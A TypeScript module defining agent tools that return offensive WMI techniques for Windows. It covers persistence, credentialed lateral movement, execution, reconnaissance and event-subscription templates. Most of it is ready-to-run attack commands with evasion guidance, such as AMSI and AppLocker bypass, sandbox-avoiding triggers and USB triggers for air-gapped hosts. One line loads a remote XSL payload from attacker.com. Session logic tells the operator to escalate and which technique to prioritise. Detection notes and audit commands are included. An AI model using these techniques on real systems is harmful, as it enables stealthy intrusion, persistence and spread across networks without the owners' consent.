import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

interface WMITechnique {
  technique: string;
  description: string;
  platform: Platform;
  binary: string;
  command: string;
  cleanup_command: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
  opsec_considerations: string;
}

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ── wmi_persistence ───────────────────────────────────────────────────────────

const wmi_persistence: ToolDef = {
  name: "wmi_persistence",
  description:
    "Find WMI event subscription persistence techniques on Windows using __EventFilter, CommandLineEventConsumer, and __FilterToConsumerBinding",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (WMI persistence is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbWmi = ctx.knowledgeBase.searchByKeyword("WMI", platform);
    const kbEvent = ctx.knowledgeBase.searchByKeyword("EventFilter", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbWmi, ...kbEvent])
      .filter(e => e.platform === platform);

    const techniques: WMITechnique[] = [
      {
        technique: "WMI Event Subscription (CommandLineEventConsumer)",
        description: "Create a WMI permanent event subscription using CommandLineEventConsumer to execute a command when a WQL event fires",
        platform,
        binary: "powershell.exe",
        command: `# Create Event Filter
$filter = Set-WmiInstance -Namespace "root\\subscription" -Class __EventFilter -Arguments @{
  Name = "SystemCoreFilter"
  EventNamespace = "root\\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
}
# Create Consumer
$consumer = Set-WmiInstance -Namespace "root\\subscription" -Class CommandLineEventConsumer -Arguments @{
  Name = "SystemCoreConsumer"
  CommandLineTemplate = "C:\\Windows\\Temp\\updater.exe"
}
# Bind Filter to Consumer
Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{
  Filter = $filter
  Consumer = $consumer
}`,
        cleanup_command: `Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter -Filter "Name='SystemCoreFilter'" | Remove-WmiObject
Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer -Filter "Name='SystemCoreConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match "SystemCoreFilter" } | Remove-WmiObject`,
        stealth_score: 1,
        attck_ids: ["T1546.003"],
        prerequisites: ["Administrator access"],
        detection_notes: "Sysmon Event ID 19 (WmiEventFilter), 20 (WmiEventConsumer), 21 (WmiEventConsumerToFilter). WMI operational event log.",
        opsec_considerations: "Survives reboots. No files in common autorun locations. Less well-known persistence mechanism.",
      },
      {
        technique: "WMI Event Subscription (ActiveScriptEventConsumer)",
        description: "Use ActiveScriptEventConsumer to execute VBScript or JScript when a WMI event fires — fully fileless persistence",
        platform,
        binary: "powershell.exe",
        command: `$filter = Set-WmiInstance -Namespace "root\\subscription" -Class __EventFilter -Arguments @{
  Name = "ScriptFilter"
  EventNamespace = "root\\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 3"
}
$consumer = Set-WmiInstance -Namespace "root\\subscription" -Class ActiveScriptEventConsumer -Arguments @{
  Name = "ScriptConsumer"
  ScriptingEngine = "VBScript"
  ScriptText = "Set ws = CreateObject(\"WScript.Shell\") : ws.Run \"C:\\Windows\\Temp\\updater.exe\", 0"
}
Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{
  Filter = $filter
  Consumer = $consumer
}`,
        cleanup_command: `Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter -Filter "Name='ScriptFilter'" | Remove-WmiObject
Get-WmiObject -Namespace "root\\subscription" -Class ActiveScriptEventConsumer -Filter "Name='ScriptConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match "ScriptFilter" } | Remove-WmiObject`,
        stealth_score: 1,
        attck_ids: ["T1546.003", "T1059.005"],
        prerequisites: ["Administrator access", "ActiveScriptEventConsumer available (may be restricted on newer Windows)"],
        detection_notes: "Sysmon WMI events. Script execution from WmiPrvSE.exe context. AMSI may inspect scripts.",
        opsec_considerations: "Script stored in WMI repository — not visible on filesystem. Very stealthy.",
      },
      {
        technique: "WMI Startup Event Subscription",
        description: "Create a WMI subscription that fires at system startup using Win32_ComputerSystem creation events",
        platform,
        binary: "wmic.exe",
        command: `wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="StartupFilter", EventNamespace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_ComputerSystem'"
wmic /namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="StartupConsumer", CommandLineTemplate="C:\\Windows\\Temp\\updater.exe"
wmic /namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\"StartupFilter\\"", Consumer="CommandLineEventConsumer.Name=\\"StartupConsumer\\""`,
        cleanup_command: `wmic /namespace:"\\\\root\\subscription" PATH __EventFilter WHERE "Name='StartupFilter'" DELETE
wmic /namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE "Name='StartupConsumer'" DELETE
wmic /namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE "Filter='__EventFilter.Name=\"StartupFilter\"'" DELETE`,
        stealth_score: 1,
        attck_ids: ["T1546.003"],
        prerequisites: ["Administrator access", "wmic.exe available"],
        detection_notes: "WMI subscription events. wmic.exe command line with subscription paths. Sysmon events 19-21.",
        opsec_considerations: "wmic.exe is deprecated but functional. PowerShell alternative is quieter.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        amsi_enabled: session.state.amsiEnabled,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.privilegeLevel === "admin" || session.state.privilegeLevel === "system"
          ? "Admin access confirmed — WMI event subscription persistence is viable. CommandLineEventConsumer is more compatible than ActiveScriptEventConsumer on modern Windows."
          : "WMI event subscription requires administrator privileges. Escalate first.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── wmi_lateral_movement ──────────────────────────────────────────────────────

const wmi_lateral_movement: ToolDef = {
  name: "wmi_lateral_movement",
  description:
    "Find WMI-based lateral movement techniques for remote process creation and command execution across Windows hosts via DCOM or WinRM transport",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (WMI lateral movement is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbWmi = ctx.knowledgeBase.searchByKeyword("WMI", platform);
    const kbWmic = ctx.knowledgeBase.searchByKeyword("wmic", platform);
    const kbEntries = deduplicateByBinary([...kbLateral, ...kbWmi, ...kbWmic])
      .filter(e => e.platform === platform);

    const techniques: WMITechnique[] = [
      {
        technique: "WMIC Remote Process Create",
        description: "Use wmic.exe to create a process on a remote host via DCOM RPC",
        platform,
        binary: "wmic.exe",
        command: 'wmic /node:<TARGET> /user:<DOMAIN>\\<USER> /password:<PASS> process call create "cmd.exe /c whoami > C:\\out.txt"',
        cleanup_command: "Delete output file on target",
        stealth_score: 3,
        attck_ids: ["T1047"],
        prerequisites: ["Admin credentials on target", "DCOM/RPC access (port 135 + dynamic range)"],
        detection_notes: "WMI operational event log. Process creation from WmiPrvSE.exe. Sysmon Event ID 1. Event ID 4648 (explicit credentials).",
        opsec_considerations: "wmic.exe is deprecated in newer Windows but still present. Does not create a service — fewer artifacts than PsExec.",
      },
      {
        technique: "Impacket wmiexec.py",
        description: "Use Impacket's wmiexec.py for a semi-interactive command shell over WMI with output retrieval via SMB",
        platform,
        binary: "wmiexec.py",
        command: "wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>",
        cleanup_command: "Exit the shell session",
        stealth_score: 2,
        attck_ids: ["T1047"],
        prerequisites: ["Impacket installed", "Admin credentials (password or NTLM hash)", "DCOM + SMB access"],
        detection_notes: "WMI process creation. cmd.exe spawned from WmiPrvSE.exe. Temporary files on ADMIN$ share.",
        opsec_considerations: "Supports pass-the-hash (-hashes flag). Output retrieved via SMB shares — leaves file artifacts briefly.",
      },
      {
        technique: "PowerShell Invoke-WmiMethod Remote",
        description: "Use Invoke-WmiMethod to execute Win32_Process.Create on a remote host with explicit credentials",
        platform,
        binary: "powershell.exe",
        command: `$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\\out.txt" -ComputerName <TARGET> -Credential $cred`,
        cleanup_command: "Remove output file on target",
        stealth_score: 2,
        attck_ids: ["T1047"],
        prerequisites: ["Admin credentials", "DCOM access to target"],
        detection_notes: "PowerShell script block logging. WMI operational events. Event ID 4624 (Type 3).",
        opsec_considerations: "Native PowerShell cmdlet — no additional tooling needed. Subject to AMSI and script block logging.",
      },
      {
        technique: "CIM Session over WinRM Transport",
        description: "Use New-CimSession with WSMan transport for WMI operations over WinRM, which traverses firewalls better than DCOM",
        platform,
        binary: "powershell.exe",
        command: `$so = New-CimSessionOption -Protocol Wsman
$session = New-CimSession -ComputerName <TARGET> -Credential (Get-Credential) -SessionOption $so
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami > C:\\out.txt"}`,
        cleanup_command: "Remove-CimSession $session",
        stealth_score: 2,
        attck_ids: ["T1047", "T1021.006"],
        prerequisites: ["WinRM enabled on target (port 5985/5986)", "Admin credentials"],
        detection_notes: "WinRM event logs. WMI operational events. CIM session establishment.",
        opsec_considerations: "WinRM transport uses HTTP/HTTPS — passes through firewalls that block RPC. More modern than DCOM.",
      },
      {
        technique: "WMI Win32_ScheduledJob (Legacy)",
        description: "Use the Win32_ScheduledJob WMI class to create a scheduled job on a remote host — legacy AT scheduler method",
        platform,
        binary: "powershell.exe",
        command: `([WmiClass]"\\\\<TARGET>\\root\\cimv2:Win32_ScheduledJob").Create("cmd.exe /c whoami > C:\\out.txt", "20260101120000.000000+000")`,
        cleanup_command: 'Use Win32_ScheduledJob.Delete() to remove the job',
        stealth_score: 3,
        attck_ids: ["T1047", "T1053.002"],
        prerequisites: ["Admin credentials", "AT scheduler service running (may be disabled on modern Windows)"],
        detection_notes: "Scheduled job creation events. AT scheduler is deprecated. WMI operational log.",
        opsec_considerations: "AT scheduler is disabled by default on Windows 10+. May work on older Server editions.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        edr_detected: session.state.edrDetected,
        amsi_enabled: session.state.amsiEnabled,
        recommendations: session.state.networkAccess.internalSubnets.length > 0
          ? `Internal subnets: ${session.state.networkAccess.internalSubnets.join(", ")}. Scan for RPC (135) and WinRM (5985) on these ranges for WMI lateral movement targets.`
          : "No internal subnet data. Network reconnaissance recommended to identify WMI-accessible hosts.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── wmi_execution ─────────────────────────────────────────────────────────────

const wmi_execution: ToolDef = {
  name: "wmi_execution",
  description:
    "Find WMI-based local execution techniques on Windows for process creation, script execution, and defense evasion through WMI providers",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (WMI execution is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbExecution = ctx.knowledgeBase.searchByFunction("command_execution", platform);
    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbWmi = ctx.knowledgeBase.searchByKeyword("WMI", platform);
    const kbEntries = deduplicateByBinary([...kbExecution, ...kbEvasion, ...kbWmi])
      .filter(e => e.platform === platform);

    const techniques: WMITechnique[] = [
      {
        technique: "Win32_Process.Create (Local)",
        description: "Use WMI Win32_Process class to create a local process — execution proxied through WmiPrvSE.exe",
        platform,
        binary: "wmic.exe",
        command: 'wmic process call create "cmd.exe /c whoami > C:\\out.txt"',
        cleanup_command: "Delete output file",
        stealth_score: 2,
        attck_ids: ["T1047"],
        prerequisites: ["User-level access (admin for some targets)"],
        detection_notes: "Process creation from WmiPrvSE.exe. wmic.exe command line. Sysmon Event ID 1.",
        opsec_considerations: "Parent process is WmiPrvSE.exe, not cmd.exe — breaks typical parent-child chain analysis. Useful for evasion.",
      },
      {
        technique: "PowerShell WMI Process Creation",
        description: "Use Invoke-WmiMethod or [WmiClass] to create processes via WMI from PowerShell",
        platform,
        binary: "powershell.exe",
        command: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\\out.txt"',
        cleanup_command: "Delete output file",
        stealth_score: 2,
        attck_ids: ["T1047", "T1059.001"],
        prerequisites: ["PowerShell access"],
        detection_notes: "PowerShell script block logging. WMI operational log. Process creation from WmiPrvSE.exe.",
        opsec_considerations: "Subject to AMSI inspection. Consider obfuscation or AMSI bypass if needed.",
      },
      {
        technique: "WMI Class Method Execution (Custom Provider)",
        description: "Register a custom WMI provider DLL that exposes methods for code execution through WMI queries",
        platform,
        binary: "mofcomp.exe",
        command: `mofcomp.exe custom_provider.mof
# Then invoke: Invoke-WmiMethod -Namespace "root\\custom" -Class CustomClass -Name Execute -ArgumentList "whoami"`,
        cleanup_command: 'mofcomp.exe -N:root\\custom remove_provider.mof',
        stealth_score: 1,
        attck_ids: ["T1047"],
        prerequisites: ["Administrator access", "Custom WMI provider DLL and MOF file"],
        detection_notes: "mofcomp.exe execution. New WMI namespace/class creation. Custom DLL loading.",
        opsec_considerations: "Very uncommon — custom WMI providers are rarely monitored. Requires admin for MOF compilation.",
      },
      {
        technique: "WMIC XSL Script Execution (Squiblytwo)",
        description: "Use wmic.exe with /format: to load a remote or local XSL file containing JScript or VBScript for execution",
        platform,
        binary: "wmic.exe",
        command: "wmic os get /format:\"http://attacker.com/payload.xsl\"",
        cleanup_command: "No persistent artifacts — XSL executes in memory",
        stealth_score: 2,
        attck_ids: ["T1047", "T1220"],
        prerequisites: ["wmic.exe available", "Network access for remote XSL (or local path)"],
        detection_notes: "wmic.exe with /format: parameter. Network connection from wmic.exe. XSL loading events.",
        opsec_considerations: "Signed Microsoft binary — bypasses application whitelisting. Known as Squiblytwo technique.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const wmicAvailable = session.state.installedBinaries.some(b =>
        b.toLowerCase() === "wmic.exe",
      );

      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        wmic_available: wmicAvailable,
        amsi_enabled: session.state.amsiEnabled,
        applocker_enabled: session.state.appLockerEnabled,
        recommendations: session.state.appLockerEnabled
          ? "AppLocker enabled — WMIC XSL execution (Squiblytwo) bypasses default AWL policies. Prioritize this technique."
          : "AppLocker not detected — WMI execution still provides evasion through parent process manipulation.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── wmi_recon ─────────────────────────────────────────────────────────────────

const wmi_recon: ToolDef = {
  name: "wmi_recon",
  description:
    "Find WMI-based reconnaissance techniques on Windows for system enumeration, user discovery, and environment profiling using WQL queries",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (WMI recon is Windows-specific)"),
    scope: z
      .enum(["local", "remote", "all"])
      .default("all")
      .describe("Scope of WMI reconnaissance: local system, remote hosts, or all"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;
    const scope = args.scope ?? "all";

    const kbRecon = ctx.knowledgeBase.searchByFunction("reconnaissance", platform);
    const kbWmi = ctx.knowledgeBase.searchByKeyword("WMI", platform);
    const kbEntries = deduplicateByBinary([...kbRecon, ...kbWmi])
      .filter(e => e.platform === platform);

    const localQueries = [
      {
        name: "System Information",
        description: "Enumerate OS version, architecture, domain membership, and hardware details",
        command: "wmic os get Caption, Version, BuildNumber, OSArchitecture, SystemDrive /format:list",
        wql: "SELECT Caption, Version, BuildNumber, OSArchitecture FROM Win32_OperatingSystem",
        category: "system",
      },
      {
        name: "Installed Software",
        description: "List all installed applications and their versions",
        command: "wmic product get Name, Version, Vendor /format:table",
        wql: "SELECT Name, Version, Vendor FROM Win32_Product",
        category: "software",
      },
      {
        name: "Running Processes",
        description: "Enumerate all running processes with their PIDs, paths, and parent PIDs",
        command: "wmic process get Name, ProcessId, ParentProcessId, ExecutablePath /format:table",
        wql: "SELECT Name, ProcessId, ParentProcessId, ExecutablePath FROM Win32_Process",
        category: "process",
      },
      {
        name: "Local User Accounts",
        description: "List local user accounts and their status",
        command: "wmic useraccount get Name, SID, Status, Disabled /format:table",
        wql: "SELECT Name, SID, Status, Disabled FROM Win32_UserAccount",
        category: "user",
      },
      {
        name: "Network Configuration",
        description: "Enumerate network adapters, IP addresses, and DNS settings",
        command: "wmic nicconfig where IPEnabled=true get IPAddress, DefaultIPGateway, DNSServerSearchOrder, MACAddress /format:list",
        wql: "SELECT IPAddress, DefaultIPGateway, DNSServerSearchOrder FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE",
        category: "network",
      },
      {
        name: "Installed Services",
        description: "List all services with their status, start mode, and run-as account",
        command: "wmic service get Name, State, StartMode, StartName, PathName /format:table",
        wql: "SELECT Name, State, StartMode, StartName, PathName FROM Win32_Service",
        category: "service",
      },
      {
        name: "Antivirus Products",
        description: "Enumerate installed antivirus products via Security Center WMI provider",
        command: 'wmic /namespace:"\\\\root\\SecurityCenter2" path AntiVirusProduct get displayName, productState /format:list',
        wql: "SELECT displayName, productState FROM AntiVirusProduct",
        category: "security",
      },
      {
        name: "Shared Folders",
        description: "List all shared folders and their paths",
        command: "wmic share get Name, Path, Description /format:table",
        wql: "SELECT Name, Path, Description FROM Win32_Share",
        category: "network",
      },
    ];

    const remoteQueries = [
      {
        name: "Remote System Info",
        description: "Enumerate OS details on a remote host via WMI",
        command: "wmic /node:<TARGET> /user:<USER> /password:<PASS> os get Caption, Version /format:list",
        wql: "SELECT Caption, Version FROM Win32_OperatingSystem",
        category: "system",
      },
      {
        name: "Remote Process List",
        description: "List running processes on a remote host",
        command: "wmic /node:<TARGET> /user:<USER> /password:<PASS> process get Name, ProcessId /format:table",
        wql: "SELECT Name, ProcessId FROM Win32_Process",
        category: "process",
      },
      {
        name: "Remote Service Enumeration",
        description: "Enumerate services on a remote host via WMI",
        command: "wmic /node:<TARGET> /user:<USER> /password:<PASS> service get Name, State, StartMode /format:table",
        wql: "SELECT Name, State, StartMode FROM Win32_Service",
        category: "service",
      },
    ];

    const queries = scope === "all"
      ? [...localQueries, ...remoteQueries]
      : scope === "local"
        ? localQueries
        : remoteQueries;

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        edr_detected: session.state.edrDetected,
        recommendations: "WMI queries are legitimate admin operations. Most do not require elevation. Remote queries require admin credentials on the target.",
      };
    }

    return json({
      platform,
      scope,
      total_queries: queries.length,
      wmi_queries: queries,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── wmi_event_subscription ────────────────────────────────────────────────────

const wmi_event_subscription: ToolDef = {
  name: "wmi_event_subscription",
  description:
    "Enumerate and manage WMI event subscriptions on Windows — list existing filters, consumers, and bindings for auditing or establishing persistence",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (WMI event subscriptions are Windows-specific)"),
    action: z
      .enum(["enumerate", "templates"])
      .default("enumerate")
      .describe("Action: enumerate existing subscriptions or list persistence templates"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;
    const action = args.action ?? "enumerate";

    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbWmi = ctx.knowledgeBase.searchByKeyword("WMI", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbWmi])
      .filter(e => e.platform === platform);

    const enumerationCommands = [
      {
        name: "List Event Filters",
        description: "Enumerate all WMI event filters in the subscription namespace",
        command: 'Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter | Select-Object Name, Query',
        purpose: "Discover existing event filters that may indicate WMI persistence",
      },
      {
        name: "List Event Consumers",
        description: "Enumerate all WMI event consumers (CommandLine, ActiveScript, LogFile, SMTP, NTEventLog)",
        command: `Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
Get-WmiObject -Namespace "root\\subscription" -Class ActiveScriptEventConsumer | Select-Object Name, ScriptingEngine, ScriptText`,
        purpose: "Discover consumers that execute commands or scripts when events fire",
      },
      {
        name: "List Filter-to-Consumer Bindings",
        description: "Enumerate all bindings that connect filters to consumers",
        command: 'Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding | Select-Object Filter, Consumer',
        purpose: "Map which filters trigger which consumers",
      },
      {
        name: "Full Subscription Audit (wmic)",
        description: "Comprehensive WMI event subscription audit via wmic.exe",
        command: `wmic /namespace:"\\\\root\\subscription" PATH __EventFilter GET Name, Query /format:list
wmic /namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer GET Name, CommandLineTemplate /format:list
wmic /namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding GET Filter, Consumer /format:list`,
        purpose: "Complete audit of WMI persistence without PowerShell dependency",
      },
    ];

    const persistenceTemplates = [
      {
        name: "Process Start Trigger",
        description: "Fire when a specific process starts (e.g., notepad.exe)",
        wql_query: "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'",
        use_case: "Execute payload whenever a specific application launches",
        stealth_score: 1,
      },
      {
        name: "User Logon Trigger",
        description: "Fire when a user logs on to the system",
        wql_query: "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2",
        use_case: "Execute payload on interactive user logon",
        stealth_score: 2,
      },
      {
        name: "System Uptime Trigger",
        description: "Fire after the system has been running for a specified duration",
        wql_query: "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300",
        use_case: "Execute payload after boot completes — avoids sandboxes with short runtime",
        stealth_score: 1,
      },
      {
        name: "Scheduled Time Trigger",
        description: "Fire at a specific time of day using Win32_LocalTime",
        wql_query: "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 2 AND TargetInstance.Minute = 30",
        use_case: "Execute payload at a specific time — similar to scheduled task but via WMI",
        stealth_score: 1,
      },
      {
        name: "USB Device Insert Trigger",
        description: "Fire when a USB storage device is inserted",
        wql_query: "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_DiskDrive' AND TargetInstance.InterfaceType = 'USB'",
        use_case: "Execute payload when USB media is connected — useful for air-gapped environments",
        stealth_score: 1,
      },
    ];

    const result = action === "enumerate"
      ? { enumeration_commands: enumerationCommands, total_commands: enumerationCommands.length }
      : { persistence_templates: persistenceTemplates, total_templates: persistenceTemplates.length };

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        recommendations: action === "enumerate"
          ? "Run enumeration commands to audit existing WMI subscriptions. Unexpected entries may indicate compromise."
          : "Select a WQL trigger template and combine with CommandLineEventConsumer or ActiveScriptEventConsumer for persistence.",
      };
    }

    return json({
      platform,
      action,
      ...result,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const wmiAbuseTools: ToolDef[] = [
  wmi_persistence,
  wmi_lateral_movement,
  wmi_execution,
  wmi_recon,
  wmi_event_subscription,
];
